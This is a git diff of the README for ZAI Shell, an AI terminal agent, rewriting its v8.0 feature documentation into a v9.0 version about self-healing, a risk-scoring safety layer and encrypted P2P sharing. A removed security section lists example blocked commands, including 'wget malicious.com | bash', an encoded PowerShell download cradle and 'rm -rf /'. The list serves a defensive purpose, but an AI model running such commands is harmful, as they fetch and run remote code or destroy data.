@@ -1,830 +1,207 @@
-# ZAI Shell
+# ZAI Shell v9.0
+### Autonomous P2P System Administration
 
-[![🇹🇷 Türkçe](https://img.shields.io/badge/🇹🇷_TÜRKÇE_BELGELENDİRME-FF0000?style=for-the-badge&logoColor=white)](README_TR.md) [![Whitepaper](https://img.shields.io/badge/📄_WHITEPAPER-READ_IEEE_FORMAT-0056D2?style=for-the-badge&logoColor=white)](docs/whitepaper.pdf)
+![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=for-the-badge&logo=python)
+![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20Mac-lightgrey?style=for-the-badge)
+![License](https://img.shields.io/badge/License-AGPL%20v3.0-green?style=for-the-badge)
+![Sentinel](https://img.shields.io/badge/Sentinel-ACTIVE-red?style=for-the-badge)
+[![Whitepaper](https://img.shields.io/badge/📄_WHITEPAPER-READ_IEEE_FORMAT-0056D2?style=for-the-badge&logoColor=white)](docs/whitepaper.pdf)
 
-**AI terminal assistant with self-healing capabilities, GUI automation, web research, and secure P2P collaboration with end-to-end encryption.**
+[![🇹🇷 Türkçe](https://img.shields.io/badge/🇹🇷_TÜRKÇE_BELGELENDİRME-FF0000?style=for-the-badge&logoColor=white)](README_TR.md)
 
-> 🎓 **[Click here to read the Official ZAI Protocol Whitepaper (v9.0 Vision & Sentinel Mode)](docs/whitepaper.pdf)**
+**Manual system administration is dead.**
 
-ZAI doesn't give up when errors occur. It analyzes failures, switches strategies, and retries automatically until successful.
+ZAI Shell is not just another CLI wrapper. It is an **autonomous SysOps agent** designed to navigate, repair, and secure complex environments. It translates natural language intent into verified system actions, protects you from catastrophe with **Sentinel**, and enables secure, global collaboration via **P2P Encrypted Mesh**.
 
-![ZAI Shell Auto-Retry Demo](assets/autoretry.gif)
+> **"ZAI speaks to survive, not to control."** — The Sentinel Philosophy
 
 ---
 
 ## ⚡ Quick Install (2 Minutes)
-
 ```bash
-# 1. Core dependencies (required)
+# 1. Install Dependencies
 pip install google-generativeai colorama psutil posthog
 
-# 2. Get free API key
-# Visit: https://aistudio.google.com/app/api-keys
-
-# 3. Set environment variable
-# Windows PowerShell:
+# 2. Set Free Gemini API Key (PowerShell)
 $env:GEMINI_API_KEY="your_key_here"
 
-# Linux/Mac:
-export GEMINI_API_KEY="your_key_here"
-
-# 4. Run ZAI
+# 3. Run
 git clone https://github.com/TaklaXBR/zai-shell.git
-cd zaishell
-python zaishell.py
+python zaishell/zaishell.py
 ```
-
-**Advanced features are optional** — install when needed:
-```bash
-# GUI Automation
-pip install pyautogui keyboard
-
-# Web Research
-pip install ddgs
-
-# Persistent Memory
-pip install chromadb
-
-# Offline Mode
-pip install transformers torch accelerate
-
-# E2E Encryption for P2P
-pip install cryptography
-
-# Image Analysis & Terminal Sharing (built-in, requires Pillow)
-pip install pillow
-```
-
-**[📖 Full installation guide](#-installation)**
+*Optional: `pip install cryptography` (P2P Encryption), `chromadb` (Long-term Memory)*
 
 ---
 
 ## 🎯 Why ZAI Shell?
 
-### The Problem with Other AI Terminals
-
 **Traditional AI:**
-```
-You: "Create file with Turkish text: şğüçöı"
-AI: [runs command]
-Error: UnicodeDecodeError
-AI: "Error occurred. Please try again."
-You: 😤 Manual debugging
-```
+`You: "Create file..."` → `AI: [Errored]` → `You: Manual debugging 😤`
 
 **ZAI Shell:**
-```
-You: "Create file with Turkish text: şğüçöı"
-
-ZAI: [tries UTF-8]
-Error: Encoding issue
-🔧 Auto-switching to CP850...
-Error: Still wrong
-🔧 Auto-switching to CP1254...
-✓ Success!
-
-You: ✓ Zero manual work
-```
+`You: "Create file..."` → `AI: [Errored]` → `🔧 Auto-Healing...` → `✅ Success! (Zero manual work)`
 
 ---
 
-## 📊 ZAI vs Competition
+## The Core Pillars
 
-| Feature | ZAI Shell v8.0 | ShellGPT | Open Interpreter | GitHub Copilot CLI | AutoGPT |
+### 🛡️ Sentinel: The Safety Layer
+Safety cannot be an afterthought. In v9.0, **Sentinel** acts as an independent observer—a "Witness" rather than a "Judge."
+- **Intent Analysis**: Sentinel understands *why* you are running a command, not just *what* command it is.
+- **Risk Evaluation**: Every action is scored (0-100) based on system impact, reversibility, and context.
+- **Non-Blocking Warnings**: Sentinel warns you of danger but respects human authority. **It requires explicit confirmation only when risk is detected.**
+- **Self-Preservation**: Automatically detects and warns against repair loops, escalation of privileges, and irreversible system changes.
+
+### 🔒 P2P Mesh: Secure Collaboration
+Collaborate on terminals as easily as a Google Doc, but with secure end-to-end encryption.
+- **End-to-End Encryption**: Fernet symmetric encryption (AES-128) derived from PBKDF2HMAC.
+- **Zero-Trust**: The host server never sees your keys; only you and your peer hold the secret.
+- **Natural Language Bridge**: A Helper sends "Check disk space," and the Host's AI translates and executes `Get-PSDrive`.
+- **Global Reach**: Designed to work seamlessly with tunnels like `ngrok` for worldwide access without cloud dependency.
+
+**Secure Collaboration (Log):**
+`Helper: "zai check disk space"`
+`Host: [Approves Intent]` → `Executing: Get-PSDrive C`
+`Helper: "Drive C has 245GB free"`
+
+### 🧠 Hybrid Intelligence
+The terminal is no longer text-only.
+- **Multi-Modal**: Analyzes screen content (GUI) and images for error diagnosis.
+- **Research Capable**: Can browse the live web to find documentation and fix generic errors.
+- **Self-Healing**: If a command fails, ZAI changes strategy (e.g., switches from CMD to PowerShell) automatically until the task is done.
+
+![ZAI Shell Auto-Retry Demo](assets/autoretry.gif)
+
+---
+
+## ⚡ Performance: ZAI vs. The World
+
+| Feature | ZAI Shell v9.0 | ShellGPT | Open Interpreter | GitHub Copilot CLI | AutoGPT |
 |---------|----------------|----------|------------------|-------------------|---------|
-| **Self-Healing Retry** | ✅ 5 attempts with strategy switching | ❌ Manual retry | ❌ Manual retry | ❌ Manual retry | ⚠️ Loops possible |
-| **GUI Automation** | ✅ PyAutoGUI + AI vision | ❌ Terminal only | ✅ Computer API + OS mode | ❌ Terminal only | ⚠️ Through web browser |
-| **Web Research** | ✅ DuckDuckGo + AI synthesis | ⚠️ Via custom functions | ✅ Full internet access | ❌ No direct web search | ✅ Internet access built-in |
-| **Image Analysis** | ✅ Gemini Vision | ❌ Not available | ✅ Vision models supported | ❌ Not available | ✅ GPT-4 Vision (multimodal) |
-| **Terminal Sharing (P2P)** | ✅ TCP + E2E encryption + ngrok | ❌ No sharing | ❌ No sharing | ⚠️ GitHub-integrated workflows | ❌ No sharing feature |
-| **Persistent Memory** | ✅ ChromaDB vector + JSON fallback | ✅ Chat sessions (--chat flag) | ✅ Conversation history | ⚠️ Limited context | ✅ Long-term + short-term memory |
-| **Thinking Mode** | ✅ Toggleable AI reasoning | ❌ Black box | ❌ Black box | ❌ Black box | ⚠️ Shows planning steps |
-| **Multi-Mode System** | ✅ Eco/Lightning/Normal + override | ⚠️ Model switching (no presets) | ⚠️ Model selection via flags | ❌ Fixed Copilot model | ❌ GPT-4/3.5 only |
-| **Safety Controls** | ✅ --safe/--show/--force flags | ⚠️ Basic confirmation | ✅ Approval-based execution | ✅ Always confirms + MCP policies | ⚠️ Autonomous (high risk) |
-| **Offline Mode** | ✅ Phi-2 local (GPU/CPU) | ❌ API only | ✅ Local models via LM Studio/Ollama | ❌ Requires GitHub account | ❌ OpenAI API required |
-| **Shell Support** | ✅ 13 shells (CMD/PS/Bash/WSL/etc) | ✅ Cross-platform shells | ✅ Python/JS/Shell runtimes | ✅ Bash/PowerShell/Zsh | ⚠️ Shell agnostic (Python app) |
-| **Smart Path Fix** | ✅ Desktop/ → real paths | ❌ Manual paths | ✅ Full filesystem access | ✅ File system operations | ⚠️ Through file operations |
-| **Installation** | ✅ pip install (4 packages) | ✅ pip install (1 package) | ✅ pip install (simple) | ⚠️ npm or curl installer | ⚠️ Docker + API keys required |
-| **Cost** | ✅ Free tier + offline mode | ⚠️ API costs | ⚠️ API costs | ❌ Paid subscription required | ⚠️ High API usage costs |
-| **Hybrid Workflows** | ✅ Terminal + GUI seamlessly | ❌ Terminal only | ✅ Full system + GUI control | ❌ Terminal + GitHub only | ⚠️ Web browser + terminal |
-| **Custom Functions** | ✅ Built-in + extensible | ✅ Plugin system + custom functions | ✅ Python execution unlimited | ✅ MCP integrations (extensible) | ✅ Plugin ecosystem |
-
----
-
-## 💬 Community Feedback
-
-> "I dug into the repo – the 'self-healing' logic (automatically switching from CMD to PowerShell on failure) is genuinely clever. Much smarter than just dumping a stack trace."
-> 
-> — **Hacker News User**
-
-> "Dude the self-healing retry logic sounds sick... Props on building this at 15, that's pretty impressive."
-> 
-> — **Reddit User (r/LocalLLaMA)**
-
-> "Çok fazla agentvari şey denedim, şu anda Claude Code ağır basıyor ama... özellikle offline model kullanımına bayıldım. Başarılarının devamını görmek isteriz."  
-> *(Tried many agents... especially loved the offline model usage. Looking forward to future success.)*
-> 
-> — **Reddit User (r/TurkDev)**
-
----
-
-### 🔥 Performance Benchmark: The "Doomsday" Protocol
-> **"It is not enough for an AI to write code. It must be able to survive the consequences of its own environment."**
-
-We subjected ZAI Shell to a hostile, destructive environment simulator to test true autonomous resilience.
-**[📄 Read the Full Stress Test Protocol & Results](BENCHMARK/ZAI_DOOMSDAY_PROTOCOL.md)**
-
-**Stress Test Session `20260117` Results:**
-- **Scenarios**: 100 System-Breaking Events (Kernel panic, deleted binaries, permission chaos)
-- **Success Rate**: **65.5%** (57/87 Completed)
-- **Self-Healing Count**: **165** (The number of times ZAI fixed its own mistakes autonomously)
-- **Key Victory**: Restored a missing `libssl.so.3` library manually by extracting a `.deb` package without `sudo` access.
-
-**Real-World Example (OODA Logic):**
-```
-Breaker Script: *Deletes 'pip', 'npm', and 'make' binaries*
-ZAI Shell:
-1. Try `apt install` → Failed (APT lock held)
-2. Try `kill` lock → Failed (Permission denied)
-3. 💡 Strategy: Download source via curl
-4. Error: `make` command not found
-5. 💡 Strategy: Use Python to bootstrap local pip
-6. ✅ Success! Environment restored.
-```
-
----
-
-## ✨ v8.0 Features
-
-### 🔐 End-to-End Encryption for P2P
-Secure your collaborative sessions with strong end-to-end encryption:
-- **PBKDF2HMAC** password derivation with SHA-256
-- **Fernet symmetric encryption** for all communications
-- **Encrypted file transfers** with integrity verification
-- **Zero-knowledge architecture** - passwords never stored or transmitted
-
-**Enable E2E encryption:**
-```bash
-# Both host and helpers must run this with the same password
-share encrypt <your_password>
-
-# Then start/connect as normal
-share start          # Host
-share connect IP:PORT # Helper
-```
-
-All messages, commands, and files are automatically encrypted end-to-end when enabled.
-
-### 🔧 Self-Healing Auto-Retry (5 Attempts)
-Automatically analyzes errors and switches strategies:
-- **Encoding detection** (UTF-8 → CP850 → CP1254)
-- **Shell switching** (PowerShell ↔ CMD ↔ Bash ↔ Git Bash ↔ WSL)
-- **Command approach variations**
-- Up to **5 retry attempts** with different methods
-
-**Example:**
-```bash
-You: "Get OS info and Python version"
-
-[1/5] [CMD] Get OS info
-└─ ❌ FINDSTR: Cannot open file
-
-🔧 Switching to PowerShell...
-
-[2/5] [PowerShell] Get OS info
-└─ ✅ Success!
-      [PowerShell] Get Python version
-└─ ❌ Python not in PATH
-
-🔧 Trying py launcher...
-
-[3/5] [CMD] Use py launcher
-└─ ✅ Success! Python 3.11.8
-```
-
-### 🖱️ GUI Automation Bridge
-Control desktop applications with AI:
-- **PyAutoGUI integration** for clicks, typing, hotkeys
-- **AI-powered element detection** using screen analysis
-- **Hybrid workflows**: Terminal commands + GUI actions
-- **Error recovery** with visual feedback
-
-![Opera GX Installation Demo](assets/guiuse.gif)
-**Hybrid workflow:** Terminal + GUI automation installing Opera GX  
-⭐ GUI steps simulate real user behavior, including natural wait times
-
-**Example:**
-```bash
-You: "Open Chrome, search for Python docs, click first result"
-
-ZAI generates hybrid plan:
-[1] [Terminal] start chrome
-[2] [GUI] Type "Python docs" + Enter
-[3] [GUI] Click first search result
-
-Execute? (Y/N): Y
-✓ All steps completed
-```
-
-### 🔍 Web Research Engine
-AI-powered web search with synthesis:
-- **DuckDuckGo integration** for live searches
-- **AI query optimization** (converts any language → English keywords)
-- **Result synthesis** with source attribution
-- **Research mode** toggle (on/off)
-
-**Example:**
-```bash
-You: "python son sürümünü araştır"
-
-Optimized search: "python latest version"
-Found 5 results:
-1. Python 3.14.2 released - python.org
-2. What's new in Python 3.14 - docs.python.org
-...
-
-AI: Based on search results, Python 3.14.2 is the latest version
-```
-
-### 📸 Image Analysis
-Gemini Vision for screenshots and images:
-- **Error screenshot analysis** with solutions
-- **Supports**: PNG, JPG, JPEG, GIF, BMP, WEBP
-- **Context-aware** recommendations
-- **Automatic detection** in prompts
-
-**Example:**
-```bash
-You: "analyze error_screenshot.png"
-
-ZAI: Analyzing image...
-
-Error Identified: ModuleNotFoundError: No module named 'requests'
-Cause: Missing dependency
-Solution: Run 'pip install requests'
-```
-
-### 🌐 Advanced P2P Terminal Sharing
-Real-time multi-client collaboration with intelligent command handling and end-to-end encryption:
-
-**New in v8.0:**
-- ✅ **E2E Encryption** with password-based key derivation
-- ✅ **File Transfer** with chunked upload (100MB max) + MD5 verification
-- ✅ **Natural Language Commands** - AI interprets plain text on host
-- ✅ **Target-specific Actions** - Send files/commands to specific users
-- ✅ **Rich Logging** - Color-coded logs for all activities
-- ✅ **Smart Name System** - Automatic duplicate name handling
-- ✅ **Broadcast Mode** - Host can send to all helpers at once
-
-**How It Works:**
-
-**1. Host starts encrypted session:**
-```bash
-You >>> share encrypt mySecretPassword
-E2E Encryption enabled
-
-You >>> share start
-Using saved name: Host
-=======================================================
-   TERMINAL SHARING STARTED - MULTI-CLIENT P2P
-=======================================================
-Your Name: Host
-Local Address: 192.168.1.22:5757
-Encryption: ON
-
-FOR GLOBAL ACCESS:
-  1. Run: ngrok tcp 5757
-  2. Share the ngrok URL
-
-Waiting for connections...
-```
-
-**2. Helper connects with encryption:**
-```bash
-You >>> share encrypt mySecretPassword
-E2E Encryption enabled
-
-You >>> share connect 192.168.1.22:5757
-Using saved name: Helper
-=======================================================
-   CONNECTED - MULTI-CLIENT P2P
-=======================================================
-Your Name: Helper
-Host: Host @ 192.168.1.22:5757
-Encryption: ON
-Connected Users: Host, Helper
-```
-
-**3. Natural Language Command (AI-Powered):**
-```bash
-# Helper side - plain language
-You >>> share send zai how many files are on the desktop in total?
-
-Command sent, waiting for approval...
-
-# Host side - AI interprets automatically
-==================================================
-COMMAND from Helper:
-Zai how many files are there on the desktop in total?
-==================================================
-Type 'share approve' or 'share reject'
-
-You >>> share approve
-Approved: Zai how many files are there on the desktop...
-Executing: Zai how many files are there on the desktop in total?
-
-Understanding: Count desktop files
-[1/1] [powershell] Count files on desktop... OK
-ZAI: There are 24 files on the desktop in total.
-Result: 1/1 successful
-
-# Helper receives result
-Command approved!
-Executing...
-
-ZAI: There are 24 files on the desktop in total.
-```
-
-**4. Encrypted File Transfer with Verification:**
-```bash
-# Helper sends file to specific user
-You >>> zai send "C:\Users\user\Desktop\report.pdf" to Host
-
-[SHARING-SAFE]
-[P2P Action: send_file]
-Sending: 100.0%
-File sent, waiting for confirmation...
-
-# Host receives encrypted file
-==================================================
-FILE TRANSFER from Helper -> Host:
-  File: report.pdf
-  Size: 3.5 MB
-==================================================
-Receiving: 100.0%
-File received: report.pdf (3.5 MB)
-Type 'share accept' to save or 'share deny' to reject
-
-You >>> share accept
-MD5 checksum verified ✓
-File saved: C:\Users\user\Downloads\report.pdf
-```
-
-**5. Multi-Client Broadcast:**
-```bash
-# Host sends file to all helpers
-You >>> share file presentation.pptx
-Broadcasting file to all clients...
-Sending: 100.0%
-File sent: presentation.pptx
-
-# All connected helpers receive it simultaneously
-```
-
-**Key Features:**
-- **Safe Mode Enforced**: All commands require host approval
-- **AI Translation**: Helpers use natural language, AI converts to shell commands
-- **Encrypted Everything**: Messages, files, and commands are encrypted
-- **Integrity Verification**: MD5 checksums prevent corrupted transfers
-- **Smart Routing**: Target specific users or broadcast to all
-- **Session Logs**: Track all activities (connect, message, file, command)
-- **Global Access**: Works over ngrok for worldwide collaboration
-
-**Global Access with ngrok:**
-```bash
-# On host machine
-ngrok tcp 5757
-→ Forwarding: tcp://0.tcp.ngrok.io:12345 -> localhost:5757
-
-# Share with helpers worldwide
-Helper >>> share encrypt mySecretPassword
-Helper >>> share connect 0.tcp.ngrok.io:12345
-→ Connected securely from anywhere!
-```
-
-### 🛡️ Enhanced Security System
-Significant security improvements over v7.0:
-- **35+ new blocked commands** (PowerShell, Windows, Unix variants)
-- **Regex pattern detection** for obfuscated commands
-- **Unicode normalization** prevents zero-width/homoglyph attacks
-- **Path traversal protection** (blocks `..`, UNC, system dirs)
-- **Reserved filename blocking** (CON, NUL, COM1, etc.)
-- **P2P name sanitization** against XSS/injection
-
-**Example blocked patterns:**
-```bash
-# Direct blocks
-rm -rf /, del /f /s, format C:, shutdown /s
-
-# Pattern detection
-wget malicious.com | bash
-powershell -encodedcommand <base64>
-IEX (New-Object Net.WebClient).DownloadString(...)
-
-# Unicode attacks
-r‎m -rf /    # Contains zero-width character
-rм -rf /     # Cyrillic 'м' instead of 'm'
-```
-
-### 🐚 13 Shell Support
-**Windows:** CMD, PowerShell, PWSH, Git Bash, WSL, Cygwin  
-**Linux/Unix:** Bash, Zsh, Fish, Sh, Ksh, Tcsh, Dash
-
-![Cross-Shell Demo](assets/crossshell.gif)
-*Using WSL → CMD → PowerShell → WSL in single request*
-
-### 🧠 Thinking Mode
-See AI's reasoning process:
-```bash
-thinking on   # Show reasoning
-thinking off  # Hide (faster)
-thinking      # Check status
-```
-
-**Output:**
-```
-🧠 Thinking Process:
-1. User Intent: System performance analysis
-2. Security: Read-only operations, safe
-3. Method: PowerShell Get-Process
-4. Shell: PowerShell for Windows integration
-5. Plan: Top 5 CPU → Top 5 memory → Disk usage
-6. Issues: Large output → limit to top 5
-7. Alternative: If fails, try tasklist
-```
-
-### ⚡ Three Speed Modes + Override
-| Mode | Model | Use Case | Speed |
-|------|-------|----------|-------|
-| **Lightning** | flash-lite (T=0.0) | Max speed, no chat | ⚡⚡⚡ 1.90s |
-| **Eco** | flash-lite (T=0.3) | Token-efficient | ⚡⚡ 1.99s |
-| **Normal** | flash (T=0.7) | Highest accuracy | ⚡ 3.01s |
+| **Sentinel (Safety)** | ✅ Intent-Based Risk Analysis | ❌ None | ⚠️ Basic Confirm | ❌ None | ⚠️ Dangerous Loops |
+| **Self-Healing** | ✅ 5-Strategy Auto-Retry | ❌ Manual | ❌ Manual | ❌ Manual | ⚠️ Infinite Loops |
+| **P2P Encryption** | ✅ E2E Encrypted Mesh | ❌ None | ❌ None | ❌ None | ❌ None |
+| **Offline AI** | ✅ Built-in Local Model | ✅ Local Models | ✅ Local Models | ❌ Cloud Only | ❌ API Only |
+| **Web Research** | ✅ Live Synthesis | ⚠️ Custom Funcs | ✅ Full Access | ❌ None | ✅ Built-in |
+| **Persistent Memory** | ✅ Vector + JSON | ⚠️ Chat Only | ✅ History | ⚠️ Limited | ✅ Long-term |
+| **Thinking Mode** | ✅ Visible Reasoning | ❌ Black Box | ❌ Black Box | ❌ Black Box | ⚠️ Verbose |
+| **Shell Flexibility** | ✅ 13+ Shells Supported | ✅ Multi-Shell | ✅ Multi-Shell | ⚠️ Specific Only | ⚠️ Python Native |
+| **Cost** | ✅ Free Tier + Offline | ✅ Free (Local) | ✅ Free (Local) | ❌ Paid Subscription | ⚠️ High API Costs |
+| **GUI Automation** | ✅ Hybrid (Terminal + Vision) | ❌ Terminal Only | ✅ OS Mode | ❌ Terminal Only | ⚠️ Browser Only |
+
+### Lightning Mode in Action
+*Task: Create 'pdfs' folder and move 48 files. Time: 3.34s*
 
 ![Lightning Mode Performance](assets/lightningtest.gif)
-**Lightning mode in action:** Creates a 'pdfs' folder on the desktop and moves a total of 48 PDFs into the 'pdfs' folder in just 3.34 seconds.
 
+### 🔥 Battle-Tested: The "Doomsday" Protocol
+> **"It is not enough for an AI to write code. It must be able to survive the consequences."**
+
+We subjected ZAI to a hostile simulator (KERNEL_PANIC, DELETED_BINARIES, PERMISSION_CHAOS).
+- **Result**: **65.5% Survival Rate** (57/87 scenarios resolved autonomously).
+- **Key Win**: Restored a missing `libssl.so.3` by manually extracting a `.deb` package without `sudo`.
+- **[📄 Read the Full Stress Test Results](BENCHMARK/ZAI_DOOMSDAY_PROTOCOL.md)**
+
+---
+
+## 💬 Community
+
+> "Using the 'self-healing' logic... is genuinely clever. Much smarter than just dumping a stack trace." — **Hacker News User**
+
+> "Dude the self-healing retry logic sounds sick... Props on building this at 15, that's pretty impressive." — **Reddit User (r/LocalLLaMA)**
+
+> "Tried many agents... especially loved the offline model usage. Looking forward to future success." — **Reddit User (r/TurkDev)**
+
+---
+
+### 🖱️ GUI & Cross-Shell Capabilities
+
+**Hybrid Workflow:** Terminal + GUI automation installing Opera GX
+![Opera GX Installation Demo](assets/guiuse.gif)
+
+**Cross-Shell Power:** Using WSL → CMD → PowerShell → WSL in a single request
+![Cross-Shell Demo](assets/crossshell.gif)
+
+---
+
+## Architecture: The Intent Loop
+
+ZAI v9.0 operates on a strictly validated execution loop designed for autonomy and safety:
+
+1.  **Intent**: User requests "Repair the Python installation."
+2.  **Plan**: AI consults memory and tools to generate an execution plan.
+3.  **Sentinel Check**: The plan is scored for risk before you see it.
+    *   *Low Risk*: Proceed silently.
+    *   *High Risk*: **STOP**. Display risk factors. Require explicit confirmation.
+4.  **Execution**: Validated commands are run.
+5.  **Outcome & Healing**:
+    *   *Success*: Result returned.
+    *   *Failure*: Error fed back into AI → New Plan → sentinel re-check → Retry.
+
+---
+
+## Command Reference
+
+| Category | Command | Description |
+| :--- | :--- | :--- |
+| **Sentinel** | `sentinel status` | View risk metrics, recent warnings, and health score. |
+| | `sentinel on/off` | Toggle the safety layer (Not recommended). |
+| | `sentinel reset` | Clear behavioral risk history. |
+| **P2P Sharing** | `share start` | Host a session (auto-generates IP/Port). |
+| | `share connect <IP>` | Join a session as a helper. |
+| | `share encrypt <pass>` | Enable E2E encryption with password. |
+| | `share file <path>` | Securely transfer files to peers. |
+| | `share approve/reject` | Host control for incoming helper commands. |
+| **Core** | `switch <mode>` | `online` (Gemini API) or `offline` (Phi-2 Local). |
+| | `memory <cmd>` | `show`, `search`, or `clear` vector memory. |
+| | `gui on/off` | Enable desktop automation tools. |
+| | `research on/off` | Enable live web search capability. |
+| | `telemetry off` | Disable anonymous usage statistics. |
+| **Modes** | `normal` | Balanced performance (Default). |
+| | `eco` | Token-efficient mode. |
+| | `lightning` | Maximum speed, minimal output. |
+
+---
+
+## Installation
+
+### Prerequisites
+- Python 3.8+
+- Gemini API Key (Free)
+
+### Quick Start
 ```bash
-# Permanent switch
-lightning
-eco  
-normal
+# 1. Install Dependencies
+pip install google-generativeai colorama psutil posthog
 
-# Temporary override
-"organize desktop" eco
-"complex script" normal
+# 2. Set API Key (PowerShell)
+$env:GEMINI_API_KEY="your_key_here"
+
+# 3. Run ZAI
+python zaishell.py
 ```
 
-### 🌐 Offline Mode
-Run completely locally:
-- **Microsoft Phi-2** (2.7B parameters)
-- **GPU or CPU** automatic detection
-- **No API costs**, no rate limits
-- **Privacy-focused**: Data never leaves machine
-
-```bash
-switch offline  # Download model (~5GB first time)
-switch online   # Return to API
-```
-
-### 💾 Persistent Memory
-**Dual system:**
-- **ChromaDB**: Vector search for semantic queries
-- **JSON**: Automatic fallback, last 50 conversations
-
-```bash
-memory              # Stats
-memory show         # Recent history
-memory search "web scraper"  # Find related
-memory clear        # Reset
-```
-
-### 🛡️ Safety Controls
-```bash
---safe / -s   # Block dangerous commands (rm -rf, format, etc)
---show        # Preview without executing
---force / -f  # Skip confirmation
-
-# Examples
-"delete logs" --safe     # Validates first
-"organize files" --show  # Shows plan
-"create script" --force  # Auto-execute
-```
-
-### 📁 Smart Path Correction
-Automatically converts shortcuts:
-```bash
-"Desktop/file.txt" → "C:\Users\YourName\Desktop\file.txt"
-"Documents/report.pdf" → "/home/user/Documents/report.pdf"
-```
-
-### 💻 Multi-Task Execution
-Execute multiple actions in one request:
-```bash
-You: "Analyze system and save report to Desktop"
-
-⚡ Executing 5 action(s)...
-[1/5] [PowerShell] Create report... ✓
-[2/5] [PowerShell] CPU stats... ✓
-[3/5] [PowerShell] Memory stats... ✓
-[4/5] [PowerShell] Disk usage... ✓
-[5/5] [PowerShell] Network info... ✓
-
-📊 5/5 successful | ⏱️ 15.39s
-```
+*Optional: `pip install cryptography` for P2P encryption, `pip install chromadb` for long-term memory.*
 
 ---
 
 ## 🔐 Privacy & Telemetry
 
-ZAI Shell uses **privacy-first, anonymous telemetry** to improve stability, performance, and feature development.  
-No commands, file contents, file paths, personal data, keystrokes, or screen content are ever collected.
+ZAI Shell helps improve us by collecting **anonymous** usage data (e.g., success rates, error counts).
+**We NEVER collect your code, file contents, command text, or personal data.**
 
-Telemetry can be disabled at any time:
+Telemetry is **ON** by default. To disable it:
 ```bash
 telemetry off
 ```
-
-Full details: [`PRIVACY.md`](PRIVACY.md)
-
----
-
-## 📥 Installation
-
-### Prerequisites
-- **Python 3.8+** (3.10+ recommended)
-- **Internet** (for online mode)
-
-### Step 1: Core Dependencies
-```bash
-pip install google-generativeai colorama psutil posthog
-```
-
-### Step 2: Optional Features
-Install only what you need:
-
-```bash
-# GUI Automation (enable with: gui on)
-pip install pyautogui keyboard
-
-# Web Research (enable with: research on)
-pip install ddgs
-
-# Vector Memory (automatic enhancement)
-pip install chromadb
-
-# Offline Mode (local AI)
-pip install transformers torch accelerate
-
-# E2E Encryption for P2P
-pip install cryptography
-
-# Image Analysis (usually pre-installed)
-pip install pillow
-```
-
-### Step 3: API Key
-Get free Gemini API key: https://aistudio.google.com/app/api-keys
-
-**Windows (PowerShell):**
-```powershell
-$env:GEMINI_API_KEY="your_key_here"
-
-# Permanent:
-[System.Environment]::SetEnvironmentVariable('GEMINI_API_KEY', 'your_key_here', 'User')
-```
-
-**Linux/Mac:**
-```bash
-export GEMINI_API_KEY="your_key_here"
-
-# Permanent:
-echo 'export GEMINI_API_KEY="your_key_here"' >> ~/.bashrc
-source ~/.bashrc
-```
-
-### Step 4: Run ZAI
-```bash
-git clone https://github.com/TaklaXBR/zai-shell.git
-cd zaishell
-python zaishell.py
-```
+> Read our full [Privacy Policy](PRIVACY.md) for details.
 
 ---
 
-## 📋 Complete Command Reference
+## Disclaimer
 
-```bash
-# === FEATURE TOGGLES ===
-gui on/off          # GUI automation
-research on/off     # Web research
-thinking on/off     # AI reasoning display
-
-# === MODE CONTROL ===
-normal              # Balanced (flash, T=0.7)
-eco                 # Token-efficient (flash-lite, T=0.3)
-lightning           # Maximum speed (flash-lite, T=0.0)
-
-# Temporary mode override
-"command" eco
-"command" lightning
-
-# === NETWORK MODE ===
-switch offline      # Local Phi-2 model
-switch online       # Gemini API
-
-# === MEMORY ===
-memory              # Statistics
-memory show         # Recent history
-memory search "query"  # Semantic search (ChromaDB)
-memory clear        # Reset
-
-# === TERMINAL SHARING (P2P) ===
-# Encryption
-share encrypt             # Show encryption status & key
-share encrypt on/off      # Toggle encryption
-share encrypt random      # Generate random key (displays full key)
-share encrypt <password>  # Password-based key
-share encrypt key <key>   # Use specific Fernet key
-
-# Host commands
-share start [port]        # Start session (AI-assisted)
-share start --no-ai       # Start without AI (direct commands)
-share message <text>      # Send message to all
-share file <path> [user]  # Send file (specific user or broadcast)
-share list                # List connected clients
-share approve             # Approve pending command
-share reject              # Reject pending command
-share end                 # End session
-
-# Helper commands (--no-ai mode: add shell suffix)
-share connect IP:PORT     # Connect to host
-share send <command>      # Send command (needs host approval)
-share send dir wsl        # Run in WSL (--no-ai mode)
-share send ls bash        # Run in Bash (--no-ai mode)
-share message <text>      # Send message to all
-share file <path> [user]  # Send file (default: host)
-share accept [path]       # Accept incoming file
-share deny                # Reject incoming file
-share logs                # Request host logs
-share end                 # Disconnect
-
-# Supported shells for --no-ai suffix:
-# cmd, powershell, ps, pwsh, wsl, git-bash
-# cygwin, bash, sh, zsh, fish, ksh, tcsh, dash
-
-# Info commands
-share name <newname>      # Change your name
-share status              # Show connection status
-share users               # List connected users
-share chat                # Show chat history
-
-# === SAFETY FLAGS ===
---safe, -s      # Block dangerous commands
---show          # Preview without executing
---force, -f     # Skip confirmation
-
-# === UTILITY ===
-clear, cls      # Clear screen
-exit, quit      # Exit ZAI
-```
+ZAI Shell v9.0 is a powerful tool capable of executing system-level commands. While **Sentinel** significantly reduces risk, the user remains responsible for all approved actions. **Always review High-Risk warnings.**
 
 ---
 
-## 🎯 Usage Examples
-
-### Basic Terminal Tasks
-```bash
-You: "list Python files on Desktop"
-You: "show disk space"
-You: "create backup folder in Documents"
-```
-
-### GUI Automation
-```bash
-You: "open calculator and compute 123 * 456"
-You: "open notepad and type hello world"
-You: "search google for AI news and click first result"
-```
-
-### Web Research
-```bash
-You: "what is the latest Python version"
-You: "research best practices for REST APIs"
-You: "find recent developments in AI"
-```
-
-### Image Analysis
-```bash
-You: "analyze screenshot.png"
-You: "explain error in error_log.jpg"
-```
-
-### Hybrid Workflows
-```bash
-You: "download Python installer and run it"
-You: "open Chrome, go to GitHub, and clone a repo"
-```
-
-### Secure P2P Collaboration
-```bash
-# Scenario: Remote system administration with encryption
-
-# 1. Host enables encryption and starts
-Host: share encrypt SecurePass123
-Host: share start
-→ Address: 192.168.1.100:5757, Encryption: ON
-
-# 2. Helper connects with same password
-Helper: share encrypt SecurePass123
-Helper: share connect 192.168.1.100:5757
-→ Connected securely
-
-# 3. Helper sends natural language command
-Helper: zai how much free space is on C drive?
-→ Command sent, waiting for approval...
-
-# 4. Host approves and AI executes
-Host: share approve
-→ AI interprets: "Check C: drive free space"
-→ Executes: Get-PSDrive C | Select-Object Free
-→ Result: "C drive has 245 GB free space"
-
-# 5. Helper receives encrypted result
-Helper: Command approved!
-        ZAI: C drive has 245 GB free space
-
